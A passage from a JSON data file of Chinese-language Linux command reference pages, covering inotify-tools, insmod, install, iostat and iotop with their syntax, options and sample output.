href=\"https://github.com/rvoicilas/inotify-tools\">https://github.com/rvoicilas/inotify-tools</a></li>\n<li>  inotify-tools下载地址：<a href=\"http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz\">http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz</a></li>\n</ul>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#CentOS release 5.8/64位：</span>\ntar zxvf inotify-tools<span class=\"hljs-number\">-3.14</span>.tar.gz\ncd inotify-tools<span class=\"hljs-number\">-3.14</span>\n./configure\n<span class=\"hljs-built_in\">make</span>\n<span class=\"hljs-built_in\">make</span> install\n</code></pre>\n<p>其他Linux发行版安装方法可以参见：<a href=\"https://github.com/rvoicilas/inotify-tools/wiki#wiki-getting\">https://github.com/rvoicilas/inotify-tools/wiki#wiki-getting</a></p>\n<h3 id=\"inotify相关参数\">inotify相关参数</h3>\n<p>inotify定义了下列的接口参数，可以用来限制inotify消耗kernel memory的大小。由于这些参数都是内存参数，因此，可以根据应用需求，实时的调节其大小：</p>\n<ul>\n<li>  <code>/proc/sys/fs/inotify/max_queued_evnets</code>表示调用inotify_init时分配给inotify instance中可排队的event的数目的最大值，超出这个值的事件被丢弃，但会触发IN_Q_OVERFLOW事件。</li>\n<li>  <code>/proc/sys/fs/inotify/max_user_instances</code>表示每一个real user id可创建的inotify instatnces的数量上限。</li>\n<li>  <code>/proc/sys/fs/inotify/max_user_watches</code>表示每个inotify instatnces可监控的最大目录数量。如果监控的文件数目巨大，需要根据情况，适当增加此值的大小。</li>\n</ul>\n<p>根据以上在32位或者64位系统都可以执行：</p>\n<pre><code class=\"language-shell\">echo <span class=\"hljs-number\">104857600</span> &gt; <span class=\"hljs-regexp\">/proc/</span>sys<span class=\"hljs-regexp\">/fs/i</span>notify/max_user_watches\necho <span class=\"hljs-string\">'echo 104857600 &gt; /proc/sys/fs/inotify/max_user_watches'</span> &gt;&gt; <span class=\"hljs-regexp\">/etc/</span>rc.local\n</code></pre>\n<p>如果遇到以下错误：</p>\n<pre><code class=\"language-shell\">inotifywait: <span class=\"hljs-keyword\">error</span> <span class=\"hljs-keyword\">while</span> loading shared libraries: libinotifytools.<span class=\"hljs-keyword\">so</span>.0: cannot <span class=\"hljs-keyword\">open</span> shared object <span class=\"hljs-keyword\">file</span>: <span class=\"hljs-keyword\">No</span> such <span class=\"hljs-keyword\">file</span> or directory \n</code></pre>\n<pre><code class=\"language-shell\"> **解决方法：** \n<span class=\"hljs-number\">32</span>位系统：ln -s <span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/lib/</span>libinotifytools.so.<span class=\"hljs-number\">0</span> <span class=\"hljs-regexp\">/usr/</span>lib/libinotifytools.so.<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">64</span>位系统：ln -s <span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/lib/</span>libinotifytools.so.<span class=\"hljs-number\">0</span> <span class=\"hljs-regexp\">/usr/</span>lib64/libinotifytools.so.<span class=\"hljs-number\">0</span>\n</code></pre>\n<h3 id=\"inotifywait命令使用\">inotifywait命令使用</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">#!/bin/bash</span>\n<span class=\"hljs-comment\">#filename watchdir.sh</span>\npath=<span class=\"hljs-variable\">$1</span>\n<span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/bin/i</span>notifywait -mrq --timefmt <span class=\"hljs-string\">'%d/%m/%y/%H:%M'</span> --format <span class=\"hljs-string\">'%T %w %f'</span> -e modify,<span class=\"hljs-keyword\">delete</span>,create,attrib <span class=\"hljs-variable\">$path</span>\n\n执行输出：\n.<span class=\"hljs-regexp\">/watchdir.sh /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:34 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ .j.jsp.swp\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:34 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ .j.jsp.swx\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:34 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ .j.jsp.swx\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:34 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ .j.jsp.swp\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:34 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ .j.jsp.swp\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:34 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ .j.jsp.swp\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:34 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ .j.jsp.swp\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:34 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ .j.jsp.swp\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:35 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ <span class=\"hljs-number\">4913</span>\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:35 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ <span class=\"hljs-number\">4913</span>\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:35 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ <span class=\"hljs-number\">4913</span>\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:35 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ j.jsp\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:35 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ j.jsp\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:35 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ j.jsp\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:35 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ j.jsp~\n<span class=\"hljs-number\">04</span><span class=\"hljs-regexp\">/01/</span><span class=\"hljs-number\">13</span><span class=\"hljs-regexp\">/16:35 /</span>data<span class=\"hljs-regexp\">/wsdata/</span>tools/ .j.jsp.swp\n</code></pre>\n<h3 id=\"inotifywait命令参数\">inotifywait命令参数</h3>\n<ul>\n<li><code>-m</code>是要持续监视变化。</li>\n<li><code>-r</code>使用递归形式监视目录。</li>\n<li><code>-q</code>减少冗余信息，只打印出需要的信息。</li>\n<li><code>-e</code>指定要监视的事件列表。</li>\n<li><code>--timefmt</code>是指定时间的输出格式。</li>\n<li><code>--format</code>指定文件变化的详细信息。</li>\n</ul>\n<h3 id=\"可监听的事件\">可监听的事件</h3>\n<table>\n<thead>\n<tr>\n<th>事件</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>access</td>\n<td><strong>访问</strong> ，读取文件。</td>\n</tr>\n<tr>\n<td>modify</td>\n<td><strong>修改</strong> ，文件内容被修改。</td>\n</tr>\n<tr>\n<td>attrib</td>\n<td><strong>属性</strong> ，文件元数据被修改。</td>\n</tr>\n<tr>\n<td>move</td>\n<td><strong>移动</strong> ，对文件进行移动操作。</td>\n</tr>\n<tr>\n<td>create</td>\n<td><strong>创建</strong> ，生成新文件</td>\n</tr>\n<tr>\n<td>open</td>\n<td><strong>打开</strong> ，对文件进行打开操作。</td>\n</tr>\n<tr>\n<td>close</td>\n<td><strong>关闭</strong> ，对文件进行关闭操作。</td>\n</tr>\n<tr>\n<td>delete</td>\n<td><strong>删除</strong> ，文件被删除。</td>\n</tr>\n</tbody></table>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "insmod",
        "des": "将给定的模块加载到内核中",
        "body": "<h1 id=\"insmod\">insmod</h1>\n<p>将给定的模块加载到内核中</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>insmod命令</strong> 用于将给定的模块加载到内核中。Linux有许多功能是通过模块的方式，在需要时才载入kernel。如此可使kernel较为精简，进而提高效率，以及保有较大的弹性。这类可载入的模块，通常是设备驱动程序。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">insmod</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：不检查目前kernel版本与模块编译时的kernel版本是否一致，强制将模块载入；</span>\n<span class=\"hljs-deletion\">-k：将模块设置为自动卸除；</span>\n<span class=\"hljs-deletion\">-m：输出模块的载入信息；</span>\n<span class=\"hljs-deletion\">-o&lt;模块名称&gt;：指定模块的名称，可使用模块文件的文件名；</span>\n<span class=\"hljs-deletion\">-p：测试模块是否能正确地载入kernel；</span>\n<span class=\"hljs-deletion\">-s：将所有信息记录在系统记录文件中；</span>\n<span class=\"hljs-deletion\">-v：执行时显示详细的信息；</span>\n<span class=\"hljs-deletion\">-x：不要汇出模块的外部符号；</span>\n<span class=\"hljs-deletion\">-X：汇出模块所有的外部符号，此为预设置。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>内核模块：指定要加载的内核模块文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>加载RAID1阵列级别模块，如下所示：</p>\n<pre><code class=\"language-shell\">[root@localhost boot]# insmod <span class=\"hljs-regexp\">/lib/m</span>odules/<span class=\"hljs-number\">2.6</span>.\n<span class=\"hljs-number\">18</span>-<span class=\"hljs-number\">8</span>.el5<span class=\"hljs-regexp\">/kernel/</span>drivers<span class=\"hljs-regexp\">/md/</span>raid1.ko  \n\n[root@localhost boot]# lsmod | <span class=\"hljs-keyword\">grep</span> raid1\nraid1                  <span class=\"hljs-number\">25153</span>  <span class=\"hljs-number\">0</span>\n</code></pre>\n<p>从以上显示结果可知，RAID1模块已加载成功。只是在使用insmod命令加载模块时，需要使用绝对路径方能加载，且加载时无法自动解决依赖关系。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "install",
        "des": "安装或升级软件或备份数据",
        "body": "<h1 id=\"install\">install</h1>\n<p>安装或升级软件或备份数据</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>install命令</strong> 的作用是安装或升级软件或备份数据，它的使用权限是所有用户。install命令和cp命令类似，都可以将文件/目录拷贝到指定的地点。但是，install允许你控制目标文件的属性。install通常用于程序的makefile，使用它来将程序拷贝到目标（安装）目录。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">install</span> [<span class=\"hljs-keyword\">OPTION</span>]... [-T] SOURCE DEST\n<span class=\"hljs-keyword\">install</span> [<span class=\"hljs-keyword\">OPTION</span>]... SOURCE... DIRECTORY\n<span class=\"hljs-keyword\">install</span> [<span class=\"hljs-keyword\">OPTION</span>]... -t DIRECTORY SOURCE...\n<span class=\"hljs-keyword\">install</span> [<span class=\"hljs-keyword\">OPTION</span>]... -d DIRECTORY...\n</code></pre>\n<p>在前两种格式中，会将&lt;来源&gt;复制至&lt;目的地&gt;或将多个&lt;来源&gt;文件复制至已存在的&lt;目录&gt;，同时设定权限模式及所有者/所属组。在第三种格式中，会创建所有指定的目录及它们的主目录。长选项必须用的参数在使用短选项时也是必须的。</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">--backup[=CONTROL]：为每个已存在的目的地文件进行备份。</span>\n<span class=\"hljs-deletion\">-b：类似 --backup，但不接受任何参数。</span>\n<span class=\"hljs-deletion\">-c：(此选项不作处理)。</span>\n<span class=\"hljs-deletion\">-d，--directory：所有参数都作为目录处理，而且会创建指定目录的所有主目录。</span>\n<span class=\"hljs-deletion\">-D：创建&lt;目的地&gt;前的所有主目录，然后将&lt;来源&gt;复制至 &lt;目的地&gt;；在第一种使用格式中有用。</span>\n<span class=\"hljs-deletion\">-g，--group=组：自行设定所属组，而不是进程目前的所属组。</span>\n<span class=\"hljs-deletion\">-m，--mode=模式：自行设定权限模式 (像chmod)，而不是rwxr-xr-x。</span>\n<span class=\"hljs-deletion\">-o，--owner=所有者：自行设定所有者 (只适用于超级用户)。</span>\n<span class=\"hljs-deletion\">-p，--preserve-timestamps：以&lt;来源&gt;文件的访问/修改时间作为相应的目的地文件的时间属性。</span>\n<span class=\"hljs-deletion\">-s，--strip：用strip命令删除symbol table，只适用于第一及第二种使用格式。</span>\n<span class=\"hljs-deletion\">-S，--suffix=后缀：自行指定备份文件的&lt;后缀&gt;。</span>\n<span class=\"hljs-deletion\">-v，--verbose：处理每个文件/目录时印出名称。</span>\n<span class=\"hljs-deletion\">--help：显示此帮助信息并离开。</span>\n<span class=\"hljs-deletion\">--version：显示版本信息并离开。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">install</span> -d [<span class=\"hljs-keyword\">option</span>] DIRECTORY [DIRECTORY...]\n</code></pre>\n<p>支持多个，类似<code>mkdir -p</code>支持递归。例如：<code>install -d a/b/c e/f</code>结果和<code>mkdir -p a/b/c e/f</code>一样。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">install</span> [<span class=\"hljs-keyword\">option</span>] SOURCE DEST\n</code></pre>\n<p> <strong>复制SOURCE文件（测试不能是目录）到DEST file（文件）：</strong> </p>\n<pre><code class=\"language-shell\">install <span class=\"hljs-keyword\">a</span>/e c\n结果类似：\ncp <span class=\"hljs-keyword\">a</span>/e c    <span class=\"hljs-comment\">#注意c必须是文件。</span>\n</code></pre>\n<p> <strong>有用选项<code>-D</code>：</strong> </p>\n<pre><code class=\"language-shell\">install -D x <span class=\"hljs-selector-tag\">a</span>/<span class=\"hljs-selector-tag\">b</span>/c\n效果类似：\nmkdir -<span class=\"hljs-selector-tag\">p</span> <span class=\"hljs-selector-tag\">a</span>/<span class=\"hljs-selector-tag\">b</span> &amp;&amp; cp x <span class=\"hljs-selector-tag\">a</span>/<span class=\"hljs-selector-tag\">b</span>/c\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">install</span> [<span class=\"hljs-keyword\">option</span>] SOURCE [SOURCE...] DIRECTORY\n</code></pre>\n<p> <strong>复制多个SOURCE文件到目的目录：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">install</span> a/* d\n</code></pre>\n<p>其中d是目录。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "iostat",
        "des": "监视系统输入输出设备和CPU的使用情况",
        "body": "<h1 id=\"iostat\">iostat</h1>\n<p>监视系统输入输出设备和CPU的使用情况</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iostat命令</strong> 被用于监视系统输入输出设备和CPU的使用情况。它的特点是汇报磁盘活动统计情况，同时也会汇报出CPU使用情况。同vmstat一样，iostat也有一个弱点，就是它不能对某个进程进行深入分析，仅对系统的整体情况进行分析。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">iostat</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：仅显示CPU使用情况；</span>\n<span class=\"hljs-deletion\">-d：仅显示设备利用率；</span>\n<span class=\"hljs-deletion\">-k：显示状态以千字节每秒为单位，而不使用块每秒；</span>\n<span class=\"hljs-deletion\">-m：显示状态以兆字节每秒为单位；</span>\n<span class=\"hljs-deletion\">-p：仅显示块设备和所有被使用的其他分区的状态；</span>\n<span class=\"hljs-deletion\">-t：显示每个报告产生时的时间；</span>\n<span class=\"hljs-deletion\">-V：显示版号并退出；</span>\n<span class=\"hljs-deletion\">-x：显示扩展状态。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  间隔时间：每次报告的间隔时间（秒）；</li>\n<li>  次数：显示报告的次数。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>用<code>iostat -x /dev/sda1</code>来观看磁盘I/O的详细情况：</p>\n<pre><code class=\"language-shell\">iostat -<span class=\"hljs-keyword\">x</span> /dev/sda<span class=\"hljs-number\">1</span> \nLinux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">18</span><span class=\"hljs-number\">-164</span>.el<span class=\"hljs-number\">5</span>xen (localhost.localdomain)\n<span class=\"hljs-number\">2010</span>年<span class=\"hljs-number\">03</span>月<span class=\"hljs-number\">26</span>日  \n\navg-cpu:  <span class=\"hljs-variable\">%user</span>   <span class=\"hljs-variable\">%nice</span> <span class=\"hljs-variable\">%system</span> <span class=\"hljs-variable\">%iowait</span> \n<span class=\"hljs-variable\">%steal</span>   <span class=\"hljs-variable\">%idle</span>  \n            <span class=\"hljs-number\">0.11</span>    <span class=\"hljs-number\">0.02</span>    <span class=\"hljs-number\">0.18</span>    <span class=\"hljs-number\">0.35</span>   \n<span class=\"hljs-number\">0.03</span>    <span class=\"hljs-number\">99.31</span>  \n\nDevice:         tps   Blk_read/s    Blk_wrtn/s  \nBlk_read   Blk_wrtn  \nsda<span class=\"hljs-number\">1</span>                <span class=\"hljs-number\">0.02</span>          <span class=\"hljs-number\">0.08</span>       \n<span class=\"hljs-number\">0.00</span>          <span class=\"hljs-number\">2014</span>               <span class=\"hljs-number\">4</span> \n</code></pre>\n<p>详细说明：第二行是系统信息和监测时间，第三行和第四行显示CPU使用情况（具体内容和mpstat命令相同）。这里主要关注后面I/O输出的信息，如下所示：</p>\n<table>\n<thead>\n<tr>\n<th>标示</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Device</td>\n<td>监测设备名称</td>\n</tr>\n<tr>\n<td>rrqm/s</td>\n<td>每秒需要读取需求的数量</td>\n</tr>\n<tr>\n<td>wrqm/s</td>\n<td>每秒需要写入需求的数量</td>\n</tr>\n<tr>\n<td>r/s</td>\n<td>每秒实际读取需求的数量</td>\n</tr>\n<tr>\n<td>w/s</td>\n<td>每秒实际写入需求的数量</td>\n</tr>\n<tr>\n<td>rsec/s</td>\n<td>每秒读取区段的数量</td>\n</tr>\n<tr>\n<td>wsec/s</td>\n<td>每秒写入区段的数量</td>\n</tr>\n<tr>\n<td>rkB/s</td>\n<td>每秒实际读取的大小，单位为KB</td>\n</tr>\n<tr>\n<td>wkB/s</td>\n<td>每秒实际写入的大小，单位为KB</td>\n</tr>\n<tr>\n<td>avgrq-sz</td>\n<td>需求的平均大小区段</td>\n</tr>\n<tr>\n<td>avgqu-sz</td>\n<td>需求的平均队列长度</td>\n</tr>\n<tr>\n<td>await</td>\n<td>等待I/O平均的时间（milliseconds）</td>\n</tr>\n<tr>\n<td>svctm</td>\n<td>I/O需求完成的平均时间</td>\n</tr>\n<tr>\n<td>%util</td>\n<td>被I/O需求消耗的CPU百分比</td>\n</tr>\n</tbody></table>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "iotop",
        "des": "用来监视磁盘I/O使用状况的工具",
        "body": "<h1 id=\"iotop\">iotop</h1>\n<p>用来监视磁盘I/O使用状况的工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iotop命令</strong> 是一个用来监视磁盘I/O使用状况的top类工具。iotop具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息。Linux下的IO统计工具如iostat，nmon等大多数是只能统计到per设备的读写情况，如果你想知道每个进程是如何使用IO的就比较麻烦，使用iotop命令可以很方便的查看。</p>\n<p>iotop使用Python语言编写而成，要求Python2.5（及以上版本）和Linux kernel2.6.20（及以上版本）。iotop提供有源代码及rpm包，可从其官方主页下载。</p>\n<h3 id=\"安装\">安装</h3>\n<p> <strong>Ubuntu</strong> </p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> install iotop\n</code></pre>\n<p> <strong>CentOS</strong> </p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span> iotop\n</code></pre>\n<p> <strong>编译安装</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">wget</span> http://guichaz.free.fr/iotop/files/iotop-<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">4</span>.<span class=\"hljs-number\">4</span>.tar.gz    \n<span class=\"hljs-attribute\">tar</span> zxf iotop-<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">4</span>.<span class=\"hljs-number\">4</span>.tar.gz    \n<span class=\"hljs-attribute\">python</span> setup.py build    \n<span class=\"hljs-attribute\">python</span> setup.py install\n</code></pre>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">iotop（选项）\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-o：只显示有io操作的进程</span>\n<span class=\"hljs-deletion\">-b：批量显示，无交互，主要用作记录到文件。</span>\n<span class=\"hljs-deletion\">-n NUM：显示NUM次，主要用于非交互式模式。</span>\n<span class=\"hljs-deletion\">-d SEC：间隔SEC秒显示一次。</span>\n<span class=\"hljs-deletion\">-p PID：监控的进程pid。</span>\n<span class=\"hljs-deletion\">-u USER：监控的进程用户。</span>\n</code></pre>\n<p> <strong>iotop常用快捷键：</strong> </p>\n<ol>\n<li> 左右箭头：改变排序方式，默认是按IO排序。</li>\n<li> r：改变排序顺序。</li>\n<li> o：只显示有IO输出的进程。</li>\n<li> p：进程/线程的显示方式的切换。</li>\n<li> a：显示累积使用量。</li>\n<li> q：退出。</li>\n</ol>\n<h3 id=\"实例\">实例</h3>\n<p>直接执行iotop就可以看到效果了：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Total</span> DISK read:       <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s | Total DISK write:       <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s\n  <span class=\"hljs-attribute\">TID</span>  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    command\n    <span class=\"hljs-attribute\">1</span> be/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> % init<span class=\"hljs-meta\"> [3]</span>\n    <span class=\"hljs-attribute\">2</span> be/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [kthreadd]</span>\n    <span class=\"hljs-attribute\">3</span> rt/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [migration/0]</span>\n    <span class=\"hljs-attribute\">4</span> be/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [ksoftirqd/0]</span>\n    <span class=\"hljs-attribute\">5</span> rt/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [watchdog/0]</span>\n    <span class=\"hljs-attribute\">6</span> rt/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [migration/1]</span>\n    <span class=\"hljs-attribute\">7</span> be/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [ksoftirqd/1]</span>\n    <span class=\"hljs-attribute\">8</span> rt/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [watchdog/1]</span>\n    <span class=\"hljs-attribute\">9</span> be/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [events/0]</span>\n   <span class=\"hljs-attribute\">10</span> be/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [events/1]</span>\n   <span class=\"hljs-attribute\">11</span> be/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [khelper]</span>\n<span class=\"hljs-attribute\">2572</span> be/<span class=\"hljs-number\">4</span> root        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> B/s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> %<span class=\"hljs-meta\"> [bluetooth]</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ip",
        "des": "网络配置工具",
